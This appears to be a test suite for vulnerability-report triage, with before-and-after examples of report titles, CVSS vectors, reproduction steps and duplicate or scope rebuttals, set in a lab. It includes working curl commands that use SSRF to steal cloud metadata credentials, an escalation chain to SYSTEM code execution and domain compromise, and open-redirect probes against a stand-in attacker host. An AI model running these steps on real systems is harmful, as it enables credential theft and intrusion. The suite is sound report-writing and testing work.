# mimo-v2.6-flash — reporting
# SOURCE: upstream-2 (mimo-v2.6-pro), prompt: mimo-2.6-agents.md + benchmark frame + lab details, streaming

Suite `TRIAGE-CAL-v1` — triage calibration test cases. Every case: input (before), calibrated output (after), pass criteria, regression trap (must FAIL validation).

---

## TC-01 Title formula

**Formula:** `{Vuln class} in {Component version} via {entry point/sink} {yields/measurable impact}`

**Before:** `Serious security issue with the website`
**After:** `SSRF in lab.example Node 18 backend via GET /fetch?url= yields Node process env + IMDS credential disclosure`

**Pass criteria:** class named, component + version named, parameter named, impact named, zero hype words ("critical," "devastating," "0day" banned).

**Regression trap:** `Critical flaw in fetch feature` — no class, no component, no impact → FAIL.

---

## TC-02 CVSS 4.0 vector + justification

Case: SSRF `/fetch?url=` reaching emulated IMDS.

**Vector:**
```
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:L/SA:N
```

**Justification (one line per metric, mandatory):**
- `AV:N` — endpoint internet-facing on lab range, no local access needed.
- `AC:L` — no race, no special conditions; plain GET.
- `AT:N` — no protective mitigations in front of sink.
- `PR:N` — `/fetch` reachable pre-auth (verified, repro step 2).
- `UI:N` — no user interaction; attacker fetches directly.
- `VC/VI/VA:N` — vulnerable app itself not compromised in CIA terms.
- `SC:H` — IMDS creds read = full subsequent-system (cloud account) confidentiality.
- `SI:L` — leaked IAM creds allow limited state change (token revocation aside, verified scope only).
- `SA:N` — no availability impact demonstrated.

**Before:** `Severity: 9.8 Critical (I think)` — no vector, no per-metric reason.
**Pass criteria:** vector string present, every base metric justified against lab evidence, unverified metrics set to least-favorable-claim `N`/`L`, not assumed.

**Regression trap:** `CVSS:4.0/AV:N/AC:L/PR:N/UI:N/VC:H/VI:H/VA:H` with justification "obviously worst case" — claims `VC:H/VI:H/VA:H` with no demonstrated app compromise → FAIL (unjustified severity inflation).

---

## TC-03 Impact → business risk mapping

**Before:** "An attacker could read some data."

**After:**

| Technical impact | Business risk | Evidence anchor |
|---|---|---|
| Node env vars + IMDS creds readable | Cloud account takeover → full tenant data exposure | repro step 4 output |
| Steal `VendorLab-CA` enrollment via forged AD web enrollment (if chained) | Rogue cert issuance = persistent AD backdoor, CA reissue cost | chain TC-05 step 3 |
| Redirect `lab.example/rd?u=` to phishing host | Credential harvest of vendor support accounts, brand trust loss | repro step 6 |

**Pass criteria:** every technical impact has one concrete business consequence + one piece of lab evidence; no "could lead to" without a chain.

**Regression trap:** "Risk: high reputational damage possible" — no technical anchor, no evidence → FAIL.

---

## TC-04 Reproduction steps — first-try runnable

Template: numbered, exact request, exact creds, expected output, no assumed state.

**After (SSRF case):**
```
1. From 10.99.2.10 (Ubuntu 22.04, labuser), run:
   curl -sS 'http://lab.example/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
2. Preconditions: seed IMDS role "vendorlab-role" on appliance IMDSv1 endpoint
   (appliance console: imds seed --role vendorlab-role --v1).
3. Expect HTTP 200, JSON body containing "AccessKeyId".
4. Confirm credential validity:
   AWS_ACCESS_KEY_ID=<id> AWS_SECRET_ACCESS_KEY=<key> aws sts get-caller-identity
   Expect Arn containing vendorlab-role.
5. If step 1 returns 403, IMDSv2 enforced — reseed v1 per step 2.
```

**Before:** "Try fetching localhost from the url parameter and see what happens."
**Pass criteria:** copy-paste executable, preconditions declared, expected output quoted, failure branch given.

**Regression trap:** steps saying "log in as an admin, then poke around the fetch thing" — no exact request, no precondition, no expected output → FAIL.

---

## TC-05 Chained-impact escalation argument

**Formula:** `{base finding} + {lab-verified pivot} = {escalated outcome}`, each link evidenced.

**After:**
```
Base:  SSRF /fetch?url= (repro TC-04)
Link1: IMDS creds → sts get-caller-identity verified, role vendorlab-role
Link2: role has lab EC2 describe+SSM perms → verified via iam list-attached-role-policies
Link3: SSM RunCommand on 10.99.1.15 (DC-adjacent jump box) → code exec as SYSTEM
Outcome: AD forest corp.vendorlab.test compromise from unauth web request.
```

**Before:** "This could probably be escalated to full compromise somehow."
**Pass criteria:** every `→` has either a run command or an output quote; no unverified link.

**Regression trap:** chain asserting "then attacker pivots to Domain Admin" with no command, no evidence → FAIL.

---

## TC-06 Rejection: duplicate — preemption

**Before:** "XSS in search box." → triager closes as dup of report #1042 (old XSS in header search).

**After:**
```
Scope distinction: #1042 = reflected XSS in /search?q= (header widget, fixed v1.2).
This finding = stored XSS in /profile/bio via SVG payload (POST /profile),
sink /dashboard/comment-render, shipped v2.0 — different parameter, different sink,
works on patched build where #1042 fix applied. Verified: build v2.3 payload still fires.
```

**Pass criteria:** references prior report ID, names the differentiating axis (parameter/sink/build/version), demonstrates against fixed build.

**Regression trap:** "This is definitely not a duplicate, please reopen" — no ID, no differentiator → FAIL.

---

## TC-07 Rejection: out of scope — preemption

**Before:** "Found open S3 bucket belonging to vendor's CI vendor." → out of scope.

**After:**
```
Scope anchor: lab.example is asset A-17 in Scope Sheet v3 (vendor-owned web lab).
Finding: open redirect at lab.example/rd?u= on asset A-17.
Business justification: redirect domain is vendor-controlled cert-holding host —
phishing against vendor support staff, in-scope per Scope Sheet v3 §2(b)
(asset A-17 includes subdomain trust behavior).
```

**Pass criteria:** asset ID cited, scope section cited, business reason tied to vendor-owned infrastructure; third-party findings self-rejected at intake, not forwarded.

**Regression trap:** report on `rebind.vendorlab.test` without naming the Scope Sheet asset row → FAIL.

---

## TC-08 Rejection: non-reproducible — preemption

**Before:** "Sometimes the redirect fails with an error, other times it works."

**After:**
```
Deterministic repro:
  for i in $(seq 1 50); do
    curl -sS -o /dev/null -w '%{http_code} %{redirect_url}\n' 'http://lab.example/rd?u=http://evil.vendorlab.test'
  done
Observed: 50/50 → 302 Location: http://evil.vendorlab.test
Timestamp window: 2026-05-21T09:00Z–09:05Z, backend node-18 v18.20.2, commit a1b2c3d,
config snap: nginx -T output attached.
```

**Before:** one vague sentence, none of the above.
**Pass criteria:** repeat count, timestamp, version + commit + config snapshot, observed output quoted.

**Regression trap:** "works on my machine, let me know" — no version, no config, no sample count → FAIL.

---

## TC-09 Rejection: theoretical — preemption

**Before:** "An attacker might exploit cookie tossing if the vendor ever adds a sibling subdomain."

**After:**
```
Demonstrated, not theoretical:
  curl -sS -v 'http://lab.example/rd?u=//evil.vendorlab.test/'
  → 302 redirect to attacker host with cookie set via Set-Cookie on *.vendorlab.test
PoC host: evil.vendorlab.test (10.99.2.20, listener log line 44 attached).
Screenshot + HAR: attached repro-01.har
```

**Pass criteria:** PoC executed in lab, artifacts named (HAR, listener log, screenshot), conditional language removed or backed by a repro.

**Regression trap:** "if X happens attacker could Y" with no executed step → FAIL.

---

## TC-10 Assembly gate — full report

Every report must contain, in order: `Title | Severity+Vector+Justification | Impact→Business | Repro | Chain | Rejection-Preemptions | Artifacts`.

**Regression trap:** report with sections present but vector in appendix, empty justification column → FAIL (validator: justification present per metric, not just vector string).

---

Suite validation = every TC input run through checker; regression traps must produce FAIL. Any trap passes → triage calibration drifted, re-baseline.
